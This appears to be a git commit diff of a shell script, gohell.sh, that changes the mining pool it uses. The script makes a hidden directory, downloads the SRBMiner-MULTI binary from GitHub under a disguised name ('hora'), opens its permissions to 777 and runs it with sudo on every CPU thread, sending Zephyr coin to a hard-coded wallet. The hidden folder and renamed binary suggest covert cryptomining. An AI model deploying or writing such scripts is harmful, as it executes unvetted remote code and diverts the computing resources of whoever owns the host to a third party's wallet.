9aa02c4627dbd97a0ec252c18452a5984c93aa18
nandafiku <156932477+nandafiku@users.noreply.github.com>
2024-02-13 12:05:25 +0700

    Update gohell.sh

--- gohell.sh
+++ gohell.sh
@@ -3,4 +3,4 @@ apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
 wget -O hora https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
 chmod 777 hora
-sudo ./hora --algorithm randomx --pool de.zephyr.herominers.com:1123 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --cpu-threads $(nproc --all)
+sudo ./hora --algorithm randomx --pool us-zephyr.miningocean.org:5332 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password x --cpu-threads $(nproc --all)
